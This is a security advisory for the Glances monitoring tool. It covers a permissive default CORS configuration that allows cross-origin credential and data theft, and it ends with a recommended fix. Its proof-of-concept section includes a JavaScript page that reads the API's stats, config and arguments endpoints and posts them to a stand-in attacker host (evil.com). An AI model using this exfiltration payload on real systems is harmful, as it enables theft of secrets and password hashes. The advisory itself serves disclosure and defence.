# [H] Glances's Default CORS Configuration Allows Cross-Origin Credential Theft

## Summary
Severity: High
Advisory: GHSA-9jfm-9rc6-2hfq
CVE: CVE-2026-32610
CWE: CWE-942
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-9jfm-9rc6-2hfq
Type: github-advisory

## Affected
- PyPI: `Glances` — affected >=0 <4.5.2

## Details
## Summary

The Glances REST API web server ships with a default CORS configuration that sets `allow_origins=["*"]` combined with `allow_credentials=True`. When both of these options are enabled together, Starlette's `CORSMiddleware` reflects the requesting `Origin` header value in the `Access-Control-Allow-Origin` response header instead of returning the literal `*` wildcard. This effectively grants any website the ability to make credentialed cross-origin API requests to the Glances server, enabling cross-site data theft of system monitoring information, configuration secrets, and command line arguments from any user who has an active browser session with a Glances instance.

## Details

The CORS configuration is set up in `glances/outputs/glances_restful_api.py` lines 290-299:

```python
# glances/outputs/glances_restful_api.py:290-299
# FastAPI Enable CORS
# https://fastapi.tiangolo.com/tutorial/cors/
self._app.add_middleware(
    CORSMiddleware,
    # Related to https://github.com/nicolargo/glances/issues/2812
    allow_origins=config.get_list_value('outputs', 'cors_origins', default=["*"]),
    allow_credentials=config.get_bool_value('outputs', 'cors_credentials', default=True),
    allow_methods=config.get_list_value('outputs', 'cors_methods', default=["*"]),
    allow_headers=config.get_list_value('outputs', 'cors_headers', default=["*"]),
)
```

The defaults are loaded from the config file, but when no config is provided (which is the common case for most deployments), the defaults are:
- `cors_origins = ["*"]` (all origins)
- `cors_credentials = True` (allow credentials)

Per the CORS specification, browsers should not send credentials when `Access-Control-Allow-Origin: *`. However, Starlette's `CORSMiddleware` implements a workaround: when `allow_origins=["*"]` and `allow_credentials=True`, the middleware reflects the requesting origin in the response header instead of using `*`. This means:

1. Attacker hosts `https://evil.com/steal.html`
2. Victim (who has authenticated to Glances via browser Basic Auth dialog) visits that page
3. JavaScript on `evil.com` makes `fetch("http://glances-server:61208/api/4/config", {credentials: "include"})`
4. The browser sends the stored Basic Auth credentials
5. Starlette responds with `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`
6. The browser allows JavaScript to read the response
7. Attacker exfiltrates the configuration including sensitive data

When Glances is running **without** `--password` (the default for most internal network deployments), no authentication is required at all. Any website can directly read all API endpoints including system stats, process lists, configuration, and command line arguments.

## PoC

**Step 1: Attacker hosts a malicious page.**

```html
<!-- steal-glances.html hosted on attacker's server -->
<script>
async function steal() {
  const target = "http://glances-server:61208";
  
  // Steal system stats (processes, CPU, memory, network, disk)
  const all = await fetch(target + "/api/4/all", {credentials: "include"});
  const allData = await all.json();
  
  // Steal configuration (may contain database passwords, API keys)
  const config = await fetch(target + "/api/4/config", {credentials: "include"});
  const configData = await config.json();
  
  // Steal command line args (contains password hash, SNMP creds)
  const args = await fetch(target + "/api/4/args", {credentials: "include"});
  const argsData = await args.json();
  
  // Exfiltrate to attacker
  fetch("https://evil.com/collect", {
    method: "POST",
    body: JSON.stringify({all: allData, config: configData, args: argsData})
  });
}
steal();
</script>
```

**Step 2: Verify CORS headers (without auth, default Glances).**

```bash
# Start Glances web server (default, no password)
glances -w

# From a different origin, verify the CORS headers
curl -s -D- -o /dev/null \
  -H "Origin: https://evil.com" \
  http://localhost:61208/api/4/all

# Expected response headers include:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

**Step 3: Verify data theft (without auth).**

```bash
curl -s http://localhost:61208/api/4/all | python -m json.tool | head -20
curl -s http://localhost:61208/api/4/config | python -m json.tool
curl -s http://localhost:61208/api/4/args | python -m json.tool
```

**Step 4: With authentication enabled, verify CORS still allows cross-origin credentialed requests.**

```bash
# Start Glances with password
glances -w --password

# Preflight request with credentials
curl -s -D- -o /dev/null \
  -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  http://localhost:61208/api/4/all

# Expected: Access-Control-Allow-Origin: https://evil.com
# Expected: Access-Control-Allow-Credentials: true
```

## Impact

- **Without `--password` (default):** Any website visited by a user on the same network can silently read all Glances API endpoints, including complete system monitoring data (process list with command lines, CPU/memory/disk stats, network interfaces and IP addresses, filesystem mounts, Docker container info), configuration file contents (which may contain database passwords, export backend credentials, API keys), and command line arguments.

- **With `--password`:** If the user has previously authenticated via the browser's Basic Auth dialog (which caches credentials), any website can make cross-origin requests that carry those cached credentials. This allows exfiltration of all the above data plus the password hash itself (via `/api/4/args`).

- **Network reconnaissance:** An attacker can use this to map internal network infrastructure by having victims visit a page that probes common Glances ports (61208) on internal IPs.

- **Chained with POST endpoints:** The CORS policy also allows `POST` methods, enabling an attacker to clear event logs (`/api/4/events/clear/all`) or modify process monitoring (`/api/4/processes/extended/{pid}`).

## Recommended Fix

Change the default CORS credentials setting to `False`, and when credentials are enabled, require explicit origin configuration instead of wildcard:

```python
# glances/outputs/glances_restful_api.py

# Option 1: Change default to not allow credentials with wildcard origins
cors_origins = config.get_list_value('outputs', 'cors_origins', default=["*"])
cors_credentials = config.get_bool_value('outputs', 'cors_credentials', default=False)  # Changed from True

# Option 2: Reject the insecure combination at startup
if cors_origins == ["*"] and cors_credentials:
    logger.warning(
        "CORS: allow_origins='*' with allow_credentials=True is insecure. "
        "Setting allow_credentials to False. Configure specific origins to enable credentials."
    )
    cors_credentials = False

self._app.add_middleware(
    CORSMiddleware,
    allow_origins=cors_origins,
    allow_credentials=cors_credentials,
    allow_methods=config.get_list_value('outputs', 'cors_methods', default=["GET"]),  # Also restrict methods
    allow_headers=config.get_list_value('outputs', 'cors_headers', default=["*"]),
)
```

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-9jfm-9rc6-2hfq
- https://nvd.nist.gov/vuln/detail/CVE-2026-32610
- https://github.com/nicolargo/glances/commit/4465169b71d93991f1e49740fe02428291099832
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.2
